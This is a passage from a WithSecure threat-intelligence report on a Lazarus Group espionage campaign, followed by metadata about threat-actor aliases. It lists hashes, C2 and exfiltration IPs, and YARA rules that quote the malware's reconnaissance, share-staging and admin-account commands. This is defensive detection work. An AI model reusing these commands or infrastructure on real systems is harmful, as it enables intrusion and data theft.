WithSecure’s\nattribution confidence. Based on the observations\nfrom victimology, attribution of the threat actor and the\nimplemented techniques, tactics, and procedures in\nthe campaign, WithSecure™ assesses the objective of\nthe campaign to be for intelligence gain.\n\n\n-----\n\n**Document name | Security level**\n\n\n### 8. IOCs and Detection\n\n\n##### Mimikatz\n\nb2b36600ce41129fa85a15a7177a61b7cb714000\n45b35d1176598be7755a6d56ad8009bb03f3c5b1f7564e93c5b4ec2de6f4f88c80c9691dc068206f\n\n##### Bind shell\n\n407b934895741a1d3b197e4e3c3d2e3284ebc76a\n\n##### GREASE2\n\n7c40d4ded95f425fa01895f9d4359c9ef250290a\n\n##### Cobalt Strike\n\ncbf1529bf025523532666b0b3d2adbdae657db16\naa489231455dc2e56e2399edd7c10b5522608a7d\n\n##### 3Proxy\n\n8b0fb0e478d18a358783429eaed53ca0fe892b37\n\n##### Webshells\n\n8c384b77b7100d6469e5e7b5cfa779dbcbcaa9ab,\ncarbon.jsp\n88df19687e6aa8da376e37a8d71421b5b78a2cb4,\nbase.jsp\n61156df8e4a5eadac8137c1cbd55145eab654726,\nload_static.php (WSO webshell)\n\n##### User Agent\n\nMozilla/5.0 (X11; Linux x86_64; rv:91.0)\nGecko/20100101 Firefox/91.0\n\n##### Dtrack\n\n47f12a1976552a1319bd58d813f213d7ebdef4fa\n\n\n##### SSH Public Key\n\nAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtMmxhqo7YwkVbyaaMD7FXSIJbkPJL9TUIOMkuDeDqKox0+8+HS96fuQplZF2bI1AFzhgNm8OVxg3UY8qPnocI=\n\n##### All files\n\nb2b36600ce41129fa85a15a7177a61b7cb714000\n45b35d1176598be7755a6d56ad8009bb03f3c5b1\nf7564e93c5b4ec2de6f4f88c80c9691dc068206f\n407b934895741a1d3b197e4e3c3d2e3284ebc76a\n7c40d4ded95f425fa01895f9d4359c9ef250290a\ncbf1529bf025523532666b0b3d2adbdae657db16\n8b0fb0e478d18a358783429eaed53ca0fe892b37\n8c384b77b7100d6469e5e7b5cfa779dbcbcaa9ab\n88df19687e6aa8da376e37a8d71421b5b78a2cb4\naf9bc7ef25755982a00aca920ee7ad51f76c5cc2\n47f12a1976552a1319bd58d813f213d7ebdef4fa\n\n##### IPs\n\n104.225.129[.]86, Cobalt Strike C2\n104.225.129[.]103, Cobalt Strike C2, exfiltration target\n15.207.207[.]64, Acres.exe C2\n\n##### Associated Infrastructure\n\n209.95.60[.]92, connected to webshell with suspicious\nuser agent\n175.45.176[.]27, connected to webshell with suspicious user agent\n23.237.32[.]34, connected to webshell with suspicious\nuser agent\n193.176.211[.]0/24, connected to webshell with suspicious user agent\n146.185.26[.]150, connected to webshell with suspicious user agent\n154.6.26[.]2, connected to webshell with suspicious\nuser agent\n\n\n-----\n\n**Document name | Security level**\n\n\n##### Yara rules\n\n\nrule lazarus_dtrack_unpacked\n{\nmeta:\nauthor=\"Withsecure Threat Intelligence\"\ndescription=\"Detects unpacked dtrack variant with smb data staging\"\ndate=\"2023-01-01\"\n\nstrings:\n$str_mutex = \"MTX_Global\"\n$str_cmd_1 = \"/c net use \\\\\\\\\" wide\n$str_cmd_2 = \"/c ping -n 3 127.0.01 > NUL % echo EEE > \\\"%s\\\"\" wide\n$str_cmd_3 = \"/c move /y %s \\\\\\\\\" wide\n$str_cmd_4 = \"/c systeminfo > \\\"%s\\\" & tasklist > \\\"%s\\\" & netstat -naop tcp > \\\"%s\\\"\" wide\n\ncondition:\nuint16(0) == 0x5A4D and\nall of them\n}\n\n\nrule lazarus_dtrack_unpacked\n{\nmeta:\nauthor=\" Withsecure Threat Intelligence \"\ndescription=\"Detects lazarus acres.exe 64bit rat written with QT framework\"\ndate=\"2023-01-01\"\n\nstrings:\n$str_nopineapple = \"< No Pineapple! >\"\n$str_qt_library = \"Qt 5.12.10\"\n$str_xor = {8B 10 83 F6 ?? 83 FA 01 77}\n\ncondition:\nuint16(0) == 0x5A4D and\nall of them\n}\n\n\n-----\n\n**Document name | Security level**\n\n\nrule lazarus_grease2\n{\nmeta:\nauthor=\" Withsecure Threat Intelligence \"\ndescription=\"Detects GREASE2 malware\"\ndate=\"2023-01-01\"\n\nstrings:\n$str_rdpconf = \"c: \\\\windows\\\\temp\\\\RDPConf.exe\" fullword nocase\n$str_rdpwinst = \"c: \\\\windows\\\\temp\\\\RDPWInst.exe\" fullword nocase\n$str_net_user = \"net user”\n$str_admins_add = \"net localgroup administrators\"\n\ncondition:\nuint16(0) == 0x5A4D and\nall of them\n}\n\n\nrule lazarus_bindshell\n{\nmeta:\nauthor=\" Withsecure Threat Intelligence \"\ndescription=\"Detects bind shell from Lazarus group\"\ndate=\"2023-01-01\"\n\nstrings:\n$str_comspec = \"COMSPEC\"\n$str_consolewindow = \"GetConsoleWindow\"\n$str_ShowWindow = \"ShowWindow\"\n$str_WSASocketA = \"WSASocketA\"\n$str_CreateProcessA = \"CreateProcessA\"\n$str_port = {B9 4D 05 00 00 89}\n\ncondition:\nuint16(0) == 0x5A4D and\nall of them\n}\n\n\n-----\n\n## Who We Are\n\n###### WithSecure™, formerly F-Secure Business, is cyber security's reliable partner. IT service providers, MSSPs and businesses – along with the largest financial institutions, manufacturers, and thousands of the world's most advanced communications and technology providers – trust us for outcome- based cyber security that protects and enables their operations. Our AI-driven protection secures endpoints and cloud collaboration, and our intelligent detection and response are powered by experts who identify business risks by proactively hunting for threats and confronting live attacks. Our consultants partner with enterprises and tech challengers to build resilience through evidence-based security advice. With more than 30 years of experience in building technology that meets business objectives, we've built our portfolio to grow with our partners through flexible commercial models.\n\n WithSecure™ Corporation was founded in 1988, and is listed on NASDAQ OMX Helsinki Ltd.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://labs.withsecure.com/content/dam/labs/docs/WithSecure-Lazarus-No-Pineapple-Threat-Intelligence-Report-2023.pdf"
    ],
    "report_names": [
        "WithSecure-Lazarus-No-Pineapple-Threat-Intelligence-Report-2023.pdf"
    ],
    "threat_actors": [
        {
            "id": "838f6ced-12a4-4893-991a-36d231d96efd",
            "created_at": "2022-10-25T15:50:23.347455Z",
            "updated_at": "2025-03-27T02:00:55.449316Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "Andariel",
                "Silent Chollima",
                "PLUTONIUM",
                "Onyx Sleet"
            ],
            "source_name": "MITRE:Andariel",
            "tools": [
                "Rifdoor",
                "gh0st RAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1bdb91cf-f1a6-4bed-8cfa-c7ea1b635ebd",
            "created_at": "2022-10-25T16:07:23.766784Z",
            "updated_at": "2025-03-27T02:02:09.971636Z",
            "deleted_at": null,
            "main_name": "Bluenoroff",
            "aliases": [
                "APT 38",
                "ATK 117",
                "Alluring Pisces",
                "Black Alicanto",
                "Bluenoroff",
                "CTG-6459",
                "Copernicium",
                "Nickel Gladstone",
                "Sapphire Sleet",
                "Selective Pisces",
                "Stardust Chollima",
                "T-APT-15",
                "TA444",
                "TAG-71",
                "TEMP.Hermit"
            ],
            "source_name": "ETDA:Bluenoroff",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5cbf6c32-482d-4cd2-9d11-0d9311acdc28",
            "created_at": "2023-01-06T13:46:38.39927Z",
            "updated_at": "2025-03-27T02:00:02.823829Z",
            "deleted_at": null,
            "main_name": "ENERGETIC BEAR",
            "aliases": [
                "DYMALLOY",
                "TG-4192",
                "Crouching Yeti",
                "Group 24",
                "Havex",
                "IRON LIBERTY",
                "Blue Kraken",
                "ALLANITE",
                "Koala Team",
                "G0035",
                "ATK6",
                "ITG15",
                "Ghost Blizzard",
                "BERSERK BEAR"
            ],
            "source_name": "MISPGALAXY:ENERGETIC BEAR",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c1eadfd8-6e9c-4024-902d-555c9530fcea",
            "created_at": "2023-01-06T13:46:38.645834Z",
            "updated_at": "2025-03-27T02:00:02.881844Z",
            "deleted_at": null,
            "main_name": "TEMP.Hermit",
            "aliases": [],
            "source_name": "MISPGALAXY:TEMP.Hermit",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "110e7160-a8cc-4a66-8550-f19f7d418117",
            "created_at": "2023-01-06T13:46:38.427592Z",
            "updated_at": "2025-03-27T02:00:02.830659Z",
            "deleted_at": null,
            "main_name": "Silent Chollima",
            "aliases": [
                "Subgroup: Andariel",
                "Onyx Sleet",
                "PLUTONIUM",
                "OperationTroy",
                "Guardian of Peace",
                "GOP",
                "WHOis Team",
                "Andariel"
            ],
            "source_name": "MISPGALAXY:Silent Chollima",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "74a1f6b1-6790-44eb-9e31-9bea8ea0192b",
            "created_at": "2024-02-02T02:00:04.04584Z",
            "updated_at": "2025-03-27T02:00:03.299067Z",
            "deleted_at": null,
            "main_name": "Ruby Sleet",
            "aliases": [
                "CERIUM"
            ],
            "source_name": "MISPGALAXY:Ruby Sleet",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f426f0a0-faef-4c0e-bcf8-88974116c9d0",
            "created_at": "2022-10-25T15:50:23.240383Z",
            "updated_at": "2025-03-27T02:00:55.404232Z",
            "deleted_at": null,
            "main_name": "APT38",
            "aliases": [
                "APT38",
                "NICKEL GLADSTONE",
                "BeagleBoyz",
                "Bluenoroff",
                "Stardust Chollima",
                "Sapphire Sleet",
                "COPERNICIUM"
            ],
            "source_name": "MITRE:APT38",
            "tools": [
                "ECCENTRICBANDWAGON",
                "HOPLIGHT",
                "Mimikatz",
                "KillDisk",
                "DarkComet"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "bbe36874-34b7-4bfb-b38b-84a00b07042e",
            "created_at": "2022-10-25T15:50:23.375277Z",
            "updated_at": "2025-03-27T02:00:55.457787Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "APT37",
                "InkySquid",
                "ScarCruft",
                "Group123",
                "TEMP.Reaper",
                "Ricochet Chollima"
            ],
            "source_name": "MITRE:APT37",
            "tools": [
                "BLUELIGHT",
                "CORALDECK",
                "KARAE",
                "SLOWDRIFT",
                "ROKRAT",
                "SHUTTERSPEED",
                "POORAIM",
                "HAPPYWORK",
                "Final1stspy",
                "Cobalt Strike",
                "NavRAT",
                "DOGCALL",
                "WINERACK"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "552ff939-52c3-421b-b6c9-749cbc21a794",
            "created_at": "2023-01-06T13:46:38.742547Z",
            "updated_at": "2025-03-27T02:00:02.906537Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "ScarCruft",
                "Venus 121",
                "Moldy Pisces",
                "Group 123",
                "APT 37",
                "Group123",
                "Operation Daybreak",
                "Operation Erebus",
                "Red Eyes",
                "TA-RedAnt",
                "InkySquid",
                "Reaper Group",
                "Ricochet Chollima",
                "ATK4",
                "G0067"
            ],
            "source_name": "MISPGALAXY:APT37",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4a502340-ae29-4a3a-8142-7fbbc2ec79b5",
            "created_at": "2024-05-01T02:03:08.138302Z",
            "updated_at": "2025-03-27T02:05:17.416542Z",
            "deleted_at": null,
            "main_name": "NICKEL HYATT",
            "aliases": [
                "Dark Seoul",
                "Jumpy Pisces ",
                "Onyx Sleet ",
                "RIFLE Campaign",
                "Silent Chollima ",
                "Andariel"
            ],
            "source_name": "Secureworks:NICKEL HYATT",
            "tools": [
                " DTrack",
                " Rifle",
                " UnitBot",
                " Valefor",
                "ActiveX 0-day"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "dc78f675-b309-431d-8160-b8dcff037d4f",
            "created_at": "2024-05-01T02:03:08.142224Z",
            "updated_at": "2025-03-27T02:05:17.417972Z",
            "deleted_at": null,
            "main_name": "NICKEL KIMBALL",
            "aliases": [
                "Black Banshee ",
                "Crooked Pisces ",
                "Emerald Sleet ",
                "Kimsuky ",
                "Opal Sleet ",
                "SharpTongue ",
                "TA427 ",
                "THALLIUM ",
                "Velvet Chollima ",
                "APT43 "
            ],
            "source_name": "Secureworks:NICKEL KIMBALL",
            "tools": [
                " KONNI",
                " KimJongRAT",
                " Kimsuky",
                "BabyShark"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2025-03-27T02:05:17.415028Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2025-03-27T02:00:02.888195Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Thallium",
                "G0086",
                "APT43",
                "Springtail",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Black Banshee",
                "Operation Stolen Pencil",
                "Emerald Sleet",
                "THALLIUM"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "RevClient",
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "bc6e3644-3249-44f3-a277-354b7966dd1b",
            "created_at": "2022-10-25T16:07:23.760559Z",
            "updated_at": "2025-03-27T02:02:09.968605Z",
            "deleted_at": null,
            "main_name": "Andariel",
            "aliases": [
                "APT 45",
                "Andariel",
                "Jumpy Pisces",
                "Onyx Sleet",
                "Operation BLACKMINE",
                "Operation BLACKSHEEP/Phase 3.",
                "Operation Blacksmith",
                "Operation DESERTWOLF/Phase 3",
                "Operation GHOSTRAT",
                "Operation GoldenAxe",
                "Operation INITROY/Phase 1",
                "Operation INITROY/Phase 2",
                "Operation Mayday",
                "Operation VANXATM",
                "Operation XEDA",
                "Plutonium",
                "Silent Chollima",
                "Stonefly"
            ],
            "source_name": "ETDA:Andariel",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2025-03-27T02:02:10.108504Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "71a1e16c-3ba6-4193-be62-be53527817bc",
            "created_at": "2022-10-25T16:07:23.753455Z",
            "updated_at": "2025-03-27T02:02:09.963016Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "APT 43",
                "Black Banshee",
                "Emerald Sleet",
                "ITG16",
                "KTA082",
                "Kimsuky",
                "Larva-24005",
                "Operation Baby Coin",
                "Operation Covert Stalker",
                "Operation DEEP#DRIVE",
                "Operation DEEP#GOSU",
                "Operation Kabar Cobra",
                "Operation Mystery Baby",
                "Operation Red Salt",
                "Operation Smoke Screen",
                "Operation Stealth Power",
                "Operation Stolen Pencil",
                "SharpTongue",
                "Sparkling Pisces",
                "Springtail",
                "TA406",
                "TA427",
                "Thallium",
                "UAT-5394",
                "Velvet Chollima"
            ],
            "source_name": "ETDA:Kimsuky",
            "tools": [
                "AngryRebel",
                "AppleSeed",
                "BITTERSWEET",
                "BabyShark",
                "BoBoStealer",
                "CSPY Downloader",
                "Farfli",
                "FlowerPower",
                "Gh0st RAT",
                "Ghost RAT",
                "Gold Dragon",
                "GoldDragon",
                "GoldStamp",
                "JamBog",
                "KGH Spyware Suite",
                "KGH_SPY",
                "KPortScan",
                "KimJongRAT",
                "Kimsuky",
                "LATEOP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Lovexxx",
                "MailPassView",
                "Mechanical",
                "Mimikatz",
                "MoonPeak",
                "Moudour",
                "MyDogs",
                "Mydoor",
                "Network Password Recovery",
                "PCRat",
                "ProcDump",
                "PsExec",
                "ReconShark",
                "Remote Desktop PassView",
                "SHARPEXT",
                "SWEETDROP",
                "SmallTiger",
                "SniffPass",
                "TODDLERSHARK",
                "TRANSLATEXT",
                "Troll Stealer",
                "TrollAgent",
                "VENOMBITE",
                "WebBrowserPassView",
                "xRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
